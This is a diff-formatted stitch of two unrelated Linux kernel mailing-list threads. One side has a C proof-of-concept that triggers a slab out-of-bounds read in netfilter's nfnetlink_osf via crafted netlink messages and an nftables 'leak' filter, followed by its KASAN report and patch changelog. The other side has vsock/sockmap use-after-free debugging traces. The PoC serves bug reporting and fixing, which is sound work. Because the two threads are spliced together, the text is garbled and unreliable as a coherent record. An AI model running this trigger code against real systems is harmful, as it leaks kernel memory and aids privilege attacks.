+>          sendmsg(fd, &msg, 0);
+> 
+> 	char buf8[] = {
+> 		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+> 		0xc9, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00, 0x28, 0x01, 0x00, 0x00,
+> 		0x06, 0x0a, 0x05, 0x0c, 0xca, 0x64, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+> 		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+> 		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+> 		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+> 		0xfc, 0x00, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
+> 		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+> 		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x04,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x20,
+> 		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x10,
+> 		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
+> 		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
+> 		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x04, 0x00,
+> 		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
+> 		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+> 		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
+> 		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+> 		0x18, 0x00, 0x02, 0x80, 0x30, 0x00, 0x01, 0x80,
+> 		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
+> 		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x01, 0x00,
+> 		0x1c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x80,
+> 		0x0c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+> 		0x11, 0x00, 0x01, 0x00, 0xcb, 0x64, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
+> 	};
+> 	memset(buf, 0, sizeof(buf));
+> 	memcpy(buf, buf8, sizeof(buf8));
+> 	io.iov_len = 0x150;
+>          sendmsg(fd, &msg, 0);
 > }
 > 
-> static int __init kprobe_init(void)
-> {
->          int ret;
+> void *tcp_recv(void * data){
 > 
->          kp.pre_handler = handler_pre;
+> 	int sockfd, connfd;
+> 	struct sockaddr_in servaddr;
+> 	int len, n;
 > 
->          ret = register_kprobe(&kp);
->          if (ret < 0) {
->                  return -1;
->          }
+> 	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
+> 		perror("socket creation failed");
+> 		exit(EXIT_FAILURE);
+> 	}
 > 
->          return 0;
+> 	memset(&servaddr, 0, sizeof(servaddr));
+> 
+> 	servaddr.sin_family    = AF_INET;
+> 	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
+> 	servaddr.sin_port = htons(6146);
+> 
+> 	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
+> 		  sizeof(servaddr)) < 0 ){
+> 		perror("bind failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 
+> 	int yes = 1;
+> 	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
+> 		       sizeof(int)) == -1) {
+> 		perror("setsockopt failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 
+> 	if ((listen(sockfd, 1)) < 0) {
+> 		perror("listen failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 
+> 	connfd = accept(sockfd, NULL, 0);
+> 	if (connfd < 0) {
+> 		perror("accept failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 	len = 0;
+> 
+> 	while(1)
+> 	{
+> 		if(len >= 128)
+> 			break;
+> 		n = read(connfd, data + len, 128-len);
+> 		len += n;
+> 	}
+> 
+> 	close(sockfd);
+> 	close(connfd);
+> 
+> 	return NULL;
 > }
 > 
-> 2. insert the kprobe and run the vsock sockmap test:
+> int tcp_connect()
+> {
+> 	int sockfd;
+> 	struct sockaddr_in servaddr;
+> 	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
+> 		perror("socket creation failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 	memset(&servaddr, 0, sizeof(servaddr));
 > 
-> ./test_progs -t "sockmap_listen/sockmap VSOCK test_vsock_redir"
+> 	servaddr.sin_family    = AF_INET;
+> 	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
+> 	servaddr.sin_port = htons(6146);
 > 
+> 	if (connect(sockfd,  (const struct sockaddr *)&servaddr,
+> 		    sizeof(servaddr)) != 0) {
+> 		perror("connect failed");
+> 		exit(EXIT_FAILURE);
+> 	}
+> 	return sockfd;
+> }
 > 
+> int add_osf()
+> {
+> 	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+> 	if (fd == -1) {
+>                  errx(EXIT_FAILURE, "socket failed");
+>          }
 > 
-> I guess the problem is in sk_psock_backlog, where skb is inserted to another
-> list before skb_dequeue is called.
+> 	char iobuf1[0x268] = {0};
+> 	*(uint32_t*)(iobuf1) = 0x268;
+> 	*(uint8_t*)(iobuf1+4) = 0;
+> 	*(uint8_t*)(iobuf1+5) = 0x5;
+> 	*(uint16_t*)(iobuf1+6) = 0x405;
+> 	*(uint32_t*)(iobuf1+8) = 0x63064c36;
+> 	*(uint32_t*)(iobuf1+0x10) = 0;
 > 
-> So I tested it with the following changes, and found the problem did go away.
+> 	*(uint16_t*)(iobuf1+0x14) = 0x254;
+> 	*(uint16_t*)(iobuf1+0x16) = 1;
+> 	*(uint32_t*)(iobuf1+0x18) = 1;
+> 	*(uint32_t*)(iobuf1+0x1c) = 4;
+> 	*(uint8_t*)(iobuf1+0x20) = 2;
+> 	*(uint8_t*)(iobuf1+0x21) = 0x1;
+> 	*(uint16_t*)(iobuf1+0x22) = 0xb4;
+> 	*(uint16_t*)(iobuf1+0x24) = 0;
+> 	*(uint16_t*)(iobuf1+0x26) = 0xff;
+> 	strcpy((void*)(iobuf1+0x28), "Windows");
+> 	strcpy((void*)(iobuf1+0x48), "98");
+> 	*(uint16_t*)(iobuf1+0x88) = 2;
+> 	*(uint16_t*)(iobuf1+0x8a) = 4;
+> 	*(uint16_t*)(iobuf1+0x94) = 1;
+> 	*(uint16_t*)(iobuf1+0x96) = 1;
+> 	*(uint16_t*)(iobuf1+0xa0) = 1;
+> 	*(uint16_t*)(iobuf1+0xa2) = 1;
+> 	*(uint16_t*)(iobuf1+0xac) = 4;
+> 	*(uint16_t*)(iobuf1+0xae) = 2;
+> 	struct iovec io1 = {
+> 		.iov_base = iobuf1,
+> 		.iov_len = sizeof(iobuf1)
+> 	};
+> 	struct msghdr msg1 = {0};
+> 	msg1.msg_iov = &io1;
+> 	msg1.msg_iovlen = 1;
+> 	sendmsg(fd, &msg1, 0);
 > 
-> --- a/net/core/skmsg.c
-> +++ b/net/core/skmsg.c
-> @@ -648,7 +648,7 @@ static void sk_psock_backlog(struct work_struct *work)
->                  off = state->off;
->          }
+> 	return 0;
+> }
 > 
-> -       while ((skb = skb_peek(&psock->ingress_skb))) {
-> +       while ((skb = skb_dequeue(&psock->ingress_skb))) {
->                  len = skb->len;
->                  off = 0;
->                  if (skb_bpf_strparser(skb)) {
-> @@ -684,7 +684,6 @@ static void sk_psock_backlog(struct work_struct *work)
->                          len -= ret;
->                  } while (len);
+> int main(int argc, char *argv[])
+> {
+> 	add_osf();
 > 
-> -               skb = skb_dequeue(&psock->ingress_skb);
->                  if (!ingress) {
->                          kfree_skb(skb);
->                  }
+> 	int tid, status;
+> 	pthread_t p_thread;
+> 	int sockfd;
+> 	char buf[128] = {0};
 > 
-> Not clear what exactly happened, needs more debugging.
->
+> 	printf("[+] Create tcp communication\n");
+> 	tid = pthread_create(&p_thread, NULL, tcp_recv, (void *)buf);
+> 	printf("  [-] wait 1sec for server\n");
+> 	usleep(10000);
+> 	printf("  [-] connect to server\n");
+> 	sockfd = tcp_connect();
+> 
+> 	printf("[+] Install Filter for leak\n");
+> 	install_filter_for_leak();
+> 
+> 	printf("[+] Send packet and read data\n");
+> 	write(sockfd, buf, 128);
+> 	pthread_join(p_thread, (void **)&status);
+> 
+> 	printf("[+] Remove filter\n");
+> 	int fd1 = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+>          char iobuf1[0x48] = {0};
+> 	*(uint32_t*)(iobuf1) = 0x14;
+> 	*(uint16_t*)(iobuf1+4) = 0x10;
+> 	*(uint16_t*)(iobuf1+6) = 1;
+> 	*(uint32_t*)(iobuf1+8) = 0x63072925;
+> 	*(uint16_t*)(iobuf1+0x12) = 0xa;
+> 	*(uint16_t*)(iobuf1+0x14) = 0x20;
+> 	*(uint16_t*)(iobuf1+0x18) = 0xa02;
+> 	*(uint16_t*)(iobuf1+0x1a) = 0x5;
+> 	*(uint32_t*)(iobuf1+0x1c) = 0x63072926;
+> 	*(uint32_t*)(iobuf1+0x24) = 2;
+> 	*(uint16_t*)(iobuf1+0x28) = 0xb;
+> 	*(uint16_t*)(iobuf1+0x2a) = 1;
+> 	strcpy((void*)(iobuf1+0x2c), "filter");
+> 	*(uint32_t*)(iobuf1+0x34) = 0x14;
+> 	*(uint16_t*)(iobuf1+0x38) = 0x11;
+> 	*(uint16_t*)(iobuf1+0x3a) = 1;
+> 	*(uint32_t*)(iobuf1+0x3c) = 0x63072927;
+> 	*(uint16_t*)(iobuf1+0x46) = 0xa;
+>          struct iovec io1 = {
+> 		.iov_base = iobuf1,
+> 		.iov_len = sizeof(iobuf1)
+>          };
+>          struct msghdr msg1 = {0};
+>          msg1.msg_iov = &io1;
+>          msg1.msg_iovlen = 1;
+>          sendmsg(fd1, &msg1, 0);
+> 
+> 	return 0;
+> }
+> 
+> KASAN report:
+> 
+> ==================================================================
+> BUG: KASAN: slab-out-of-bounds in nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
+> Read of size 2 at addr ffff88804bc64272 by task poc/6431
+> 
+> CPU: 1 PID: 6431 Comm: poc Not tainted 6.0.0-rc4 #1
+> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
+> Call Trace:
+>   <IRQ>
+>   __dump_stack linux-6.0-rc4/lib/dump_stack.c:88
+>   dump_stack_lvl+0xcd/0x134 linux-6.0-rc4/lib/dump_stack.c:106
+>   print_address_description linux-6.0-rc4/mm/kasan/report.c:317
+>   print_report.cold+0x2ba/0x6e9 linux-6.0-rc4/mm/kasan/report.c:433
+>   kasan_report+0xb1/0x1e0 linux-6.0-rc4/mm/kasan/report.c:495
+>   nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
+>   nf_osf_find+0x186/0x2f0 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:281
+>   nft_osf_eval+0x37f/0x590 linux-6.0-rc4/net/netfilter/nft_osf.c:47
+>   expr_call_ops_eval linux-6.0-rc4/net/netfilter/nf_tables_core.c:214
+>   nft_do_chain+0x2b0/0x1490 linux-6.0-rc4/net/netfilter/nf_tables_core.c:264
+>   nft_do_chain_ipv4+0x17c/0x1f0 linux-6.0-rc4/net/netfilter/nft_chain_filter.c:23
+>   nf_hook_entry_hookfn linux-6.0-rc4/./include/linux/netfilter.h:142
+>   nf_hook_slow+0xc5/0x1f0 linux-6.0-rc4/net/netfilter/core.c:620
+>   nf_hook linux-6.0-rc4/./include/linux/netfilter.h:262
+>   NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:305
+>   ip_local_deliver+0x2f5/0x4e0 linux-6.0-rc4/net/ipv4/ip_input.c:254
+>   dst_input linux-6.0-rc4/./include/net/dst.h:461
+>   ip_rcv_finish+0x1cb/0x2f0 linux-6.0-rc4/net/ipv4/ip_input.c:444
+>   NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:307
+>   NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:301
+>   ip_rcv+0xc4/0x3b0 linux-6.0-rc4/net/ipv4/ip_input.c:564
+>   __netif_receive_skb_one_core+0x114/0x180 linux-6.0-rc4/net/core/dev.c:5485
+>   __netif_receive_skb+0x1f/0x1c0 linux-6.0-rc4/net/core/dev.c:5599
+>   process_backlog+0x13a/0x690 linux-6.0-rc4/net/core/dev.c:5927
+>   __napi_poll.constprop.0+0xaf/0x430 linux-6.0-rc4/net/core/dev.c:6511
+>   napi_poll linux-6.0-rc4/net/core/dev.c:6578
+>   net_rx_action+0x8d2/0xc60 linux-6.0-rc4/net/core/dev.c:6689
+>   __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
+>   do_softirq linux-6.0-rc4/kernel/softirq.c:472
+>   do_softirq+0x101/0x140 linux-6.0-rc4/kernel/softirq.c:459
+>   </IRQ>
+>   <TASK>
+>   __local_bh_enable_ip+0xf4/0x110 linux-6.0-rc4/kernel/softirq.c:396
+>   local_bh_enable linux-6.0-rc4/./include/linux/bottom_half.h:33
+>   rcu_read_unlock_bh linux-6.0-rc4/./include/linux/rcupdate.h:776
+>   ip_finish_output2+0x7d6/0x21a0 linux-6.0-rc4/net/ipv4/ip_output.c:229
+>   __ip_finish_output linux-6.0-rc4/net/ipv4/ip_output.c:306
+>   __ip_finish_output+0x396/0x650 linux-6.0-rc4/net/ipv4/ip_output.c:288
+>   ip_finish_output+0x2d/0x280 linux-6.0-rc4/net/ipv4/ip_output.c:316
+>   NF_HOOK_COND linux-6.0-rc4/./include/linux/netfilter.h:296
+>   ip_output+0x20a/0x620 linux-6.0-rc4/net/ipv4/ip_output.c:430
+>   dst_output linux-6.0-rc4/./include/net/dst.h:451
+>   ip_local_out linux-6.0-rc4/net/ipv4/ip_output.c:126
+>   __ip_queue_xmit+0x8de/0x1bd0 linux-6.0-rc4/net/ipv4/ip_output.c:532
+>   __tcp_transmit_skb+0x195b/0x3820 linux-6.0-rc4/net/ipv4/tcp_output.c:1402
+>   tcp_transmit_skb linux-6.0-rc4/net/ipv4/tcp_output.c:1420
+>   tcp_write_xmit+0xd9b/0x5f70 linux-6.0-rc4/net/ipv4/tcp_output.c:2691
+>   __tcp_push_pending_frames+0xaa/0x380 linux-6.0-rc4/net/ipv4/tcp_output.c:2875
+>   tcp_push+0x49b/0x720 linux-6.0-rc4/net/ipv4/tcp.c:728
+>   tcp_sendmsg_locked+0x2480/0x2fc0 linux-6.0-rc4/net/ipv4/tcp.c:1455
+>   tcp_sendmsg+0x2b/0x40 linux-6.0-rc4/net/ipv4/tcp.c:1483
+>   inet_sendmsg+0x99/0xe0 linux-6.0-rc4/net/ipv4/af_inet.c:819
+>   sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
+>   sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
+>   sock_write_iter+0x291/0x3d0 linux-6.0-rc4/net/socket.c:1108
+>   call_write_iter linux-6.0-rc4/./include/linux/fs.h:2187
+>   new_sync_write linux-6.0-rc4/fs/read_write.c:491
+>   vfs_write+0x9ef/0xde0 linux-6.0-rc4/fs/read_write.c:578
+>   ksys_write+0x1e8/0x250 linux-6.0-rc4/fs/read_write.c:631
+>   do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+>   do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+>   entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+> RIP: 0033:0x7f1674040fef
+> Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 29 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 31 44 89 c7 48 89 44 24 08 e8 5c fd ff ff 48
+> RSP: 002b:00007ffe90523f50 EFLAGS: 00000293 ORIG_RAX: 0000000000000001
+> RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1674040fef
+> RDX: 0000000000000080 RSI: 00007ffe90524030 RDI: 0000000000000006
+> RBP: 00007ffe905240d0 R08: 0000000000000000 R09: 0000000000000000
+> R10: 0000560534f9b61f R11: 0000000000000293 R12: 0000560534f9c1b0
+> R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+>   </TASK>
+> 
+> Allocated by task 6431:
+>   kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
+>   kasan_set_track linux-6.0-rc4/mm/kasan/common.c:45
+>   set_alloc_info linux-6.0-rc4/mm/kasan/common.c:437
+>   ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:516
+>   ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:475
+>   __kasan_kmalloc+0xa6/0xd0 linux-6.0-rc4/mm/kasan/common.c:525
+>   kasan_kmalloc linux-6.0-rc4/./include/linux/kasan.h:234
+>   kmem_cache_alloc_trace+0x25a/0x460 linux-6.0-rc4/mm/slab.c:3559
+>   kmalloc linux-6.0-rc4/./include/linux/slab.h:600
+>   nfnl_osf_add_callback+0x11f/0x550 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:316
+>   nfnetlink_rcv_msg+0xbcf/0x13f0 linux-6.0-rc4/net/netfilter/nfnetlink.c:300
+>   netlink_rcv_skb+0x153/0x420 linux-6.0-rc4/net/netlink/af_netlink.c:2501
+>   nfnetlink_rcv+0x1ac/0x420 linux-6.0-rc4/net/netfilter/nfnetlink.c:658
+>   netlink_unicast_kernel linux-6.0-rc4/net/netlink/af_netlink.c:1319
+>   netlink_unicast+0x543/0x7f0 linux-6.0-rc4/net/netlink/af_netlink.c:1345
+>   netlink_sendmsg+0x918/0xe20 linux-6.0-rc4/net/netlink/af_netlink.c:1921
+>   sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
+>   sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
+>   ____sys_sendmsg+0x6e6/0x800 linux-6.0-rc4/net/socket.c:2482
+>   ___sys_sendmsg+0x11d/0x1b0 linux-6.0-rc4/net/socket.c:2536
+>   __sys_sendmsg+0xfa/0x1d0 linux-6.0-rc4/net/socket.c:2565
+>   do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+>   do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+>   entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+> 
+> Last potentially related work creation:
+>   kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
+>   __kasan_record_aux_stack+0x7e/0x90 linux-6.0-rc4/mm/kasan/generic.c:348
+>   kvfree_call_rcu+0x74/0x940 linux-6.0-rc4/kernel/rcu/tree.c:3322
+>   put_css_set_locked linux-6.0-rc4/kernel/cgroup/cgroup.c:988
+>   put_css_set_locked+0xa9c/0x1000 linux-6.0-rc4/kernel/cgroup/cgroup.c:954
+>   put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:211
+>   put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:198
+>   cgroup_free+0x83/0x1b0 linux-6.0-rc4/kernel/cgroup/cgroup.c:6525
+>   __put_task_struct+0x113/0x3d0 linux-6.0-rc4/kernel/fork.c:840
+>   put_task_struct linux-6.0-rc4/./include/linux/sched/task.h:119
+>   delayed_put_task_struct+0x1f1/0x330 linux-6.0-rc4/kernel/exit.c:177
+>   rcu_do_batch linux-6.0-rc4/kernel/rcu/tree.c:2245
+>   rcu_core+0x7bb/0x1850 linux-6.0-rc4/kernel/rcu/tree.c:2505
+>   __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
+> 
+> The buggy address belongs to the object at ffff88804bc64000
+>   which belongs to the cache kmalloc-1k of size 1024
+> The buggy address is located 626 bytes inside of
+>   1024-byte region [ffff88804bc64000, ffff88804bc64400)
+> 
+> The buggy address belongs to the physical page:
+> page:ffffea00012f1900 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4bc64
+> flags: 0x4fff00000000200(slab|node=1|zone=1|lastcpupid=0x7ff)
+> raw: 04fff00000000200 ffffea0001023808 ffffea00012f1f08 ffff888011840700
+> raw: 0000000000000000 ffff88804bc64000 0000000100000002 0000000000000000
+> page dumped because: kasan: bad access detected
+> page_owner tracks the page as allocated
+> page last allocated via order 0, migratetype Unmovable, gfp_mask 0x2420c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_THISNODE), pid 1, tgid 1 (systemd), ts 22208538581, free_ts 22201347598
+>   prep_new_page linux-6.0-rc4/mm/page_alloc.c:2532
+>   get_page_from_freelist+0x1082/0x2ae0 linux-6.0-rc4/mm/page_alloc.c:4283
+>   __alloc_pages+0x1c7/0x510 linux-6.0-rc4/mm/page_alloc.c:5515
+>   __alloc_pages_node linux-6.0-rc4/./include/linux/gfp.h:243
+>   kmem_getpages linux-6.0-rc4/mm/slab.c:1363
+>   cache_grow_begin+0x75/0x370 linux-6.0-rc4/mm/slab.c:2569
+>   cache_alloc_refill+0x27e/0x380 linux-6.0-rc4/mm/slab.c:2942
+>   ____cache_alloc linux-6.0-rc4/mm/slab.c:3018
+>   ____cache_alloc linux-6.0-rc4/mm/slab.c:3001
+>   slab_alloc_node linux-6.0-rc4/mm/slab.c:3220
+>   kmem_cache_alloc_node_trace+0x4f5/0x560 linux-6.0-rc4/mm/slab.c:3601
+>   __do_kmalloc_node linux-6.0-rc4/mm/slab.c:3623
+>   __kmalloc_node+0x38/0x60 linux-6.0-rc4/mm/slab.c:3631
+>   kmalloc_node linux-6.0-rc4/./include/linux/slab.h:623
+>   kvmalloc_node+0x3e/0x190 linux-6.0-rc4/mm/util.c:613
+>   kvzalloc_node linux-6.0-rc4/./include/linux/slab.h:754
+>   alloc_shrinker_info+0xe9/0x290 linux-6.0-rc4/mm/vmscan.c:282
+>   mem_cgroup_css_online+0x182/0x470 linux-6.0-rc4/mm/memcontrol.c:5292
+>   online_css+0xaf/0x2a0 linux-6.0-rc4/kernel/cgroup/cgroup.c:5334
+>   css_create linux-6.0-rc4/kernel/cgroup/cgroup.c:5405
+>   cgroup_apply_control_enable+0x69f/0xc00 linux-6.0-rc4/kernel/cgroup/cgroup.c:3204
+>   cgroup_mkdir+0x5a0/0x1300 linux-6.0-rc4/kernel/cgroup/cgroup.c:5602
+>   kernfs_iop_mkdir+0x146/0x1d0 linux-6.0-rc4/fs/kernfs/dir.c:1185
+>   vfs_mkdir+0x3a9/0x650 linux-6.0-rc4/fs/namei.c:4013
+>   do_mkdirat+0x28c/0x310 linux-6.0-rc4/fs/namei.c:4038
+>   __do_sys_mkdir linux-6.0-rc4/fs/namei.c:4058
+>   __se_sys_mkdir linux-6.0-rc4/fs/namei.c:4056
+>   __x64_sys_mkdir+0xf2/0x140 linux-6.0-rc4/fs/namei.c:4056
+> page last free stack trace:
+>   reset_page_owner linux-6.0-rc4/./include/linux/page_owner.h:24
+>   free_pages_prepare linux-6.0-rc4/mm/page_alloc.c:1449
+>   free_pcp_prepare+0x4b0/0xb50 linux-6.0-rc4/mm/page_alloc.c:1499
+>   free_unref_page_prepare linux-6.0-rc4/mm/page_alloc.c:3380
+>   free_unref_page+0x19/0x520 linux-6.0-rc4/mm/page_alloc.c:3476
+>   tlb_batch_list_free linux-6.0-rc4/mm/mmu_gather.c:74
+>   tlb_finish_mmu+0x1a3/0x7e0 linux-6.0-rc4/mm/mmu_gather.c:356
+>   exit_mmap+0x1d2/0x480 linux-6.0-rc4/mm/mmap.c:3118
+>   __mmput+0x122/0x4b0 linux-6.0-rc4/kernel/fork.c:1187
+>   mmput+0x56/0x60 linux-6.0-rc4/kernel/fork.c:1208
+>   exit_mm linux-6.0-rc4/kernel/exit.c:510
+>   do_exit+0x9d9/0x29b0 linux-6.0-rc4/kernel/exit.c:782
+>   do_group_exit+0xd2/0x2f0 linux-6.0-rc4/kernel/exit.c:925
+>   __do_sys_exit_group linux-6.0-rc4/kernel/exit.c:936
+>   __se_sys_exit_group linux-6.0-rc4/kernel/exit.c:934
+>   __x64_sys_exit_group+0x3a/0x50 linux-6.0-rc4/kernel/exit.c:934
+>   do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+>   do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+>   entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+> 
+> Memory state around the buggy address:
+>   ffff88804bc64100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>   ffff88804bc64180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> ffff88804bc64200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
+>                                                               ^
+>   ffff88804bc64280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+>   ffff88804bc64300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+> 
+> ---
+> 
+> Changelog:
+> ----------
+> 
+> v1:
+> * Initial patch
+> v2:
+> * Move the validation to nfnl_osf_add_callback()
+> 
+> Fixes: f9324952088f ("netfilter: nfnetlink_osf: extract nfnetlink_subsystem code from xt_osf.c")
 
-Use the skb address obtained from skb_peek() in sk_psock_backlog() as the key,
-4 stack traces are obtained.
+I am not sure whether this is the right "Fixes" tag. While it is true I 
+introduced this line it came from the existing xt_osf.c. I guess, it is 
+fine as probably this commit is more relevant for backporting needs than 
+the original one.
 
-
-trace 0, the skb is queued to the target socket ingress queue:
-
-[  120.042016] sk_psock_skb_ingress_enqueue+0xf5/0x160
-[  120.045052] sk_psock_backlog+0x206/0x400
-[  120.047366] process_one_work+0x292/0x560
-[  120.049657] worker_thread+0x53/0x3e0
-[  120.051698] kthread+0x102/0x130
-[  120.053497] ret_from_fork+0x34/0x50
-[  120.055528] ret_from_fork_asm+0x1b/0x30
-
-
-trace 1, the skb is consumed by the user:
-
-[  120.061537] consume_skb+0x47/0x100
-[  120.063394] sk_msg_recvmsg+0x268/0x3e0
-[  120.065458] unix_bpf_recvmsg+0x16c/0x610
-[  120.067584] unix_stream_recvmsg+0x66/0xa0
-[  120.069946] sock_recvmsg+0xc4/0xd0
-[  120.072063] __sys_recvfrom+0xaf/0x120
-[  120.073933] __x64_sys_recvfrom+0x29/0x30
-[  120.076052] do_syscall_64+0x3f/0x90
-[  120.077986] entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-
-trace 2, the vsock socket is closed by the user, and a new skb with
-the same address is allocated in vsock_release:
-
-[  120.084296] __alloc_skb+0xe3/0x180
-[  120.086335] virtio_transport_alloc_skb+0x3b/0x2c0
-[  120.089174] virtio_transport_send_pkt_info+0x118/0x230
-[  120.092191] virtio_transport_release+0x29d/0x400
-[  120.094845] __vsock_release+0x3c/0x1e0
-[  120.096905] vsock_release+0x18/0x30
-[  120.098899] __sock_release+0x3d/0xc0
-[  120.100885] sock_close+0x18/0x20
-[  120.102606] __fput+0x108/0x2b0
-[  120.104636] task_work_run+0x5d/0xa0
-[  120.106876] exit_to_user_mode_prepare+0x18c/0x190
-[  120.109619] syscall_exit_to_user_mode+0x1d/0x50
-[  120.112049] do_syscall_64+0x4c/0x90
-[  120.114115] entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-
-trace 3, sk_psock_backlog() calls skb_dequeue() to unlink the skb, since
-this skb is now actually a new skb allocated in vsock_release, its prev
-and next fields are both set to NULL, NULL deref occurs.
-
-[  120.120619] skb_dequeue+0x92/0xa0
-[  120.122350] sk_psock_backlog+0x305/0x400
-[  120.124512] process_one_work+0x292/0x560
-[  120.126771] worker_thread+0x53/0x3e0
-[  120.128843] kthread+0x102/0x130
-[  120.130772] ret_from_fork+0x34/0x50
-
-To fix it, it seems reasonable to replace skb_peek() with skb_dequeue()
